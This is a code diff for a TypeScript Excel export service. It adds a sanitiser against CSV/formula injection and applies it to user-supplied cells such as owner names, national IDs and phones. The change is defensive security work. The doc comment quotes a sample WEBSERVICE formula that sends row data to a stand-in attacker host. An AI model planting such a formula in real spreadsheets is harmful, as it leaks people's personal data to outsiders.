@@ -131,6 +131,50 @@ function unitTypeHebrew(unitType: string): string {
   }
 }
 
+/**
+ * Wave 5 EXP-C1 (redteam audit 2026-05-28) — CSV / Excel formula
+ * injection neutralizer. Any cell whose first char is `=`, `+`, `-`, `@`,
+ * tab, or carriage return is interpreted as a live formula by Excel /
+ * LibreOffice / Numbers on open. With decrypted national_id + phone in
+ * adjacent cells, a single `=WEBSERVICE("https://attacker/?q="&A2&B2)`
+ * exfils the row to an external host the moment the manager opens the
+ * file. The owner.name / project.name / address validators (shared-types
+ * /owner.ts:37, project.ts:32) accept leading `=` because that's a legal
+ * Hebrew/English character — sanitisation has to happen at the SINK
+ * (this writer) where the data crosses into the spreadsheet format.
+ *
+ * The convention (OWASP "Excel CSV Injection") is to prefix a single
+ * quote: Excel treats `'=foo` as literal text but DOESN'T display the
+ * leading quote — recipient sees `=foo` rendered as text, attacker
+ * sees no formula execution.
+ *
+ * Applied to every cell whose value can originate from user input:
+ * - building.address / city / block / parcel
+ * - apartment.number / entrance / unitType
+ * - apartment.status (Hebrew label is hard-coded but defence-in-depth)
+ * - owner.name / nationalId / phone
+ *
+ * NOT applied to numeric cells (floor, sizeSqm, rooms, ownershipPct)
+ * because they bypass formula evaluation (Excel parses them as Number).
+ */
+function neutralizeFormula(v: string): string {
+  if (v.length === 0) return v;
+  const c = v.charCodeAt(0);
+  // `=` 0x3D · `+` 0x2B · `-` 0x2D · `@` 0x40 · TAB 0x09 · CR 0x0D · LF 0x0A
+  if (
+    c === 0x3d ||
+    c === 0x2b ||
+    c === 0x2d ||
+    c === 0x40 ||
+    c === 0x09 ||
+    c === 0x0d ||
+    c === 0x0a
+  ) {
+    return "'" + v;
+  }
+  return v;
+}
+
 function statusHebrew(status: string): string {
   // Hebrew labels mirror the FE apartment status badge (Doc 10).
   switch (status) {
@@ -188,11 +232,18 @@ export class ExportService {
     });
 
     // ── metadata rows ────────────────────────────────────────────────
-    const titleRow = ws.addRow([`פרויקט: ${input.project.name}`]);
+    // Wave 5 EXP-C1: each metadata string starts with a Hebrew prefix
+    // ("פרויקט: ", "סוג: ", "הופק על-ידי ") which itself doesn't trip
+    // the neutraliser, so the leading char is always safe. Defence in
+    // depth: still pipe through `neutralizeFormula` so any future
+    // refactor that drops the Hebrew prefix stays safe by default.
+    const titleRow = ws.addRow([neutralizeFormula(`פרויקט: ${input.project.name}`)]);
     titleRow.font = { name: 'Heebo', size: 14, bold: true };
     ws.mergeCells(`A1:${columnLetter(HEBREW_HEADERS.length)}1`);
 
-    const metaRow = ws.addRow([`סוג: ${input.project.type} · סטטוס: ${input.project.status}`]);
+    const metaRow = ws.addRow([
+      neutralizeFormula(`סוג: ${input.project.type} · סטטוס: ${input.project.status}`),
+    ]);
     metaRow.font = { name: 'Heebo', size: 10, italic: true };
     ws.mergeCells(`A2:${columnLetter(HEBREW_HEADERS.length)}2`);
 
@@ -202,7 +253,9 @@ export class ExportService {
       timeStyle: 'short',
     });
     const stampRow = ws.addRow([
-      `הופק על-ידי ${input.generatedBy.name} בתאריך ${fmt.format(input.generatedAt)}`,
+      neutralizeFormula(
+        `הופק על-ידי ${input.generatedBy.name} בתאריך ${fmt.format(input.generatedAt)}`,
+      ),
     ]);
     stampRow.font = { name: 'Heebo', size: 10, italic: true };
     ws.mergeCells(`A3:${columnLetter(HEBREW_HEADERS.length)}3`);
@@ -256,21 +309,25 @@ export class ExportService {
     apt: ProjectExportApartment,
     owner: ProjectExportOwner | null,
   ): void {
+    // Wave 5 EXP-C1: every user-originating string cell is run through
+    // `neutralizeFormula` before insertion. Numeric cells (floor, size,
+    // rooms, ownershipPct) and hard-coded Hebrew labels bypass eval, so
+    // the sanitiser is skipped for them.
     const row = ws.addRow([
-      b.address,
-      b.city,
-      b.block ?? '',
-      b.parcel ?? '',
-      apt.number,
+      neutralizeFormula(b.address),
+      neutralizeFormula(b.city),
+      neutralizeFormula(b.block ?? ''),
+      neutralizeFormula(b.parcel ?? ''),
+      neutralizeFormula(apt.number),
       apt.floor ?? '',
-      apt.entrance ?? '',
-      unitTypeHebrew(apt.unitType),
+      neutralizeFormula(apt.entrance ?? ''),
+      neutralizeFormula(unitTypeHebrew(apt.unitType)),
       apt.sizeSqm ?? apt.areaSqm ?? '',
       apt.rooms ?? '',
-      statusHebrew(apt.status),
-      owner?.name ?? '',
-      owner?.nationalId ?? '',
-      owner?.phone ?? '',
+      neutralizeFormula(statusHebrew(apt.status)),
+      neutralizeFormula(owner?.name ?? ''),
+      neutralizeFormula(owner?.nationalId ?? ''),
+      neutralizeFormula(owner?.phone ?? ''),
       owner ? `${owner.ownershipPct.toFixed(2)}%` : '',
     ]);
     row.font = { name: 'Heebo', size: 11 };
